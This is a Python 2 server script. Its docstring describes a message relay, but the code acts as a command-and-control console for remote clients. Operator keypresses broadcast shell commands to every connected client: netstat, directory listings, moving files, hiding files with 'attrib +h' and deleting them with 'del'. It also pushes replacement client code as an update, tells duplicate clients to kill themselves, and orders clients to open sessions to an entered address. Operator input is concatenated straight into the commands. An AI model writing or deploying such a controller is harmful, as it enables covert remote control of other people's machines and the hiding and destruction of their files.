"""
Server - receives data from many clients and sents the msg to all other clients
"""

import socket
import select
import msvcrt
import sys
import os
import time
import data_pb2
import random

SERVER_ADDRESS = "localhost"
PORT = 8081
UNACCEPTED_CONNECTIONS = 5
MAX_SIZE_RESPONSE = 10240
PIECE_LEN = 1000
MY_CHAR = 27
CHAR_ENTER = 13
MAX_RANDOM = 1000

messages_to_send = []


def read_in_chunks(file_object, chunk_size=PIECE_LEN):
    """Lazy function (generator) to read a file piece by piece.
    Default chunk size: 1k."""
    while True:
        data = file_object.read(chunk_size)
        if not data:
            break
        yield data


def send_data_to_all(data, current_socket, open_client_sockets, wlist):
    for soc in open_client_sockets:
        if soc != current_socket:
            messages_to_send.append((soc, data))
    send_waiting_messages(wlist)


def send_updates_file(f_name, open_client_sockets, wlist):
    size_of_file = os.path.getsize(f_name)
    file_id = random.randint(1, MAX_RANDOM)
    d = data_pb2.TData()
    d.serverReq.id = file_id
    d.serverReq.fileStart.id = file_id
    d.serverReq.fileStart.size_of_data = size_of_file
    d.serverReq.fileStart.file_name = raw_input("file name: ")
    send_data_to_all(d.SerializeToString(), None, open_client_sockets, wlist)
    print 'd:', d
    time.sleep(1)
    i = 0
    bytes_readed = 0
    with open(f_name, 'rb') as f:
        for piece in read_in_chunks(f):
            bytes_readed += len(piece)
            d.serverReq.fileTransfer.id = file_id
            d.serverReq.fileTransfer.index = i
            d.serverReq.fileTransfer.isLast = (bytes_readed >= size_of_file)
            d.serverReq.fileTransfer.data = piece
            print 'd:', d
            send_data_to_all(d.SerializeToString(), None, open_client_sockets, wlist)
            time.sleep(1)
            i += 1


def send_waiting_messages(wlist):
    """
    The function gets list of connections and messages and sent them.
    :param wlist: a list of connections
    :return: a list of messages that not sends yet
    """
    for message in messages_to_send:
        (client_socket, data) = message
        if client_socket in wlist:
            client_socket.send(data)
            messages_to_send.remove(message)


def handle_request(data, open_client_sockets=[], current_socket=None):
    try:
        d = data_pb2.TData()
        d.ParseFromString(data)
        if d.WhichOneof("Msg") == "clientReq":
            if d.clientReq.WhichOneof("Type") == 'clientStart':
                for soc in open_client_sockets:
                    if soc.getsockname()[0] == d.clientReq.clientStart.ip and soc.getsockname()[1] \
                            not in [d.clientReq.clientStart.port, PORT]:
                        pass
                        print "goodbye ", soc.getsockname()
                        d1 = data_pb2.TData()
                        d1.serverReq.id = random.randint(1, MAX_RANDOM)
                        d1.serverReq.killYourself.status = 0
                        send_data_to_all(d1.SerializeToString(), None, [soc], [soc])
        if d.WhichOneof("Msg") == 'clientRsp':
            print "status:", d.clientRsp.status
            if d.clientRsp.WhichOneof("Type") == 'cmdCommandResult':
                print "result", d.clientRsp.cmdCommandResult.result

                # else:
                #     for soc in open_client_sockets:
                #         if soc != current_socket:
                #             messages_to_send.append((soc, data))
    except Exception as e:
        print e.message


def send_command(cmd, open_client_sockets=None, wlist=None):
    d = data_pb2.TData()
    d.serverReq.cmdCommand.cmd = cmd
    d.serverReq.id = random.randint(1, MAX_RANDOM)
    print d
    send_data_to_all(d.SerializeToString(), None, open_client_sockets, wlist)


def send_open_socket(open_client_sockets, wlist):
    d = data_pb2.TData()
    d.serverReq.id = random.randint(1, MAX_RANDOM)
    d.serverReq.openSession.ip = raw_input("enter ip: ")
    d.serverReq.openSession.port = int(raw_input("enter port: "))
    send_data_to_all(d.SerializeToString(), None, open_client_sockets, wlist)


def send_message(msg, open_client_sockets=None, wlist=None):
    if msg.startswith('1'):
        print "update version"
        send_updates_file('client.py', open_client_sockets, wlist)
    elif msg.startswith('2'):
        print "netstat"
        send_command("netstat -a -n -o", open_client_sockets, wlist)
    elif msg.startswith('3'):
        print "ls -- error"
        send_command("ls -l", open_client_sockets, wlist)
    elif msg.startswith('4'):
        print "open new socket"
        send_open_socket(open_client_sockets, wlist)
    elif msg.startswith('5'):
        print "dir"
        send_command("cd " + raw_input("enter directory: ") + " & dir", open_client_sockets, wlist)
    elif msg.startswith('6'):
        print "move"
        send_command("move " + raw_input("enter src_file: ") + raw_input("enter dst_file: "), open_client_sockets,
                     wlist)
    elif msg.startswith('7'):
        print "hidden"
        send_command("attrib +h " + raw_input("enter file path & name: "), open_client_sockets, wlist)
    elif msg.startswith('8'):
        print "remove"
        send_command("del " + raw_input("enter file path & name: ") + " & dir", open_client_sockets, wlist)


def main():
    """
    The function opens socket of the server and listen to data that it receives.
    :return:
    """
    server_socket = socket.socket()
    server_socket.bind((SERVER_ADDRESS, PORT))
    server_socket.listen(UNACCEPTED_CONNECTIONS)

    open_client_sockets = []
    msg = ''
    print 'start server'
    while True:
        try:

            # ----------recieve data----------
            rlist, wlist, xlist = select.select([server_socket] + open_client_sockets,
                                                open_client_sockets, [])
            for current_socket in rlist:
                if current_socket is server_socket:
                    (new_socket, address) = server_socket.accept()
                    open_client_sockets.append(new_socket)
                    print new_socket.getsockname()
                else:
                    print 'New data from client!'
                    try:
                        data = current_socket.recv(MAX_SIZE_RESPONSE)
                        if not data or data == "":
                            open_client_sockets.remove(current_socket)
                            print "Connection with client closed."
                        else:
                            handle_request(data, open_client_sockets, current_socket)
                    except Exception as e:
                        open_client_sockets.remove(current_socket)
                        print "Connection with client closed."

            send_waiting_messages(wlist)

            # ----------send data----------
            if msvcrt.kbhit():
                char = msvcrt.getch()
                if char == chr(MY_CHAR):
                    break
                msg += char
                sys.stdout.write(char)
                sys.stdout.flush()
                if char == chr(CHAR_ENTER):
                    send_message(msg, open_client_sockets, wlist)
                    msg = ''
            send_waiting_messages(wlist)

        except Exception as e:
            print e.__doc__
            print e.message
            server_socket.close()


if __name__ == "__main__":
    main()
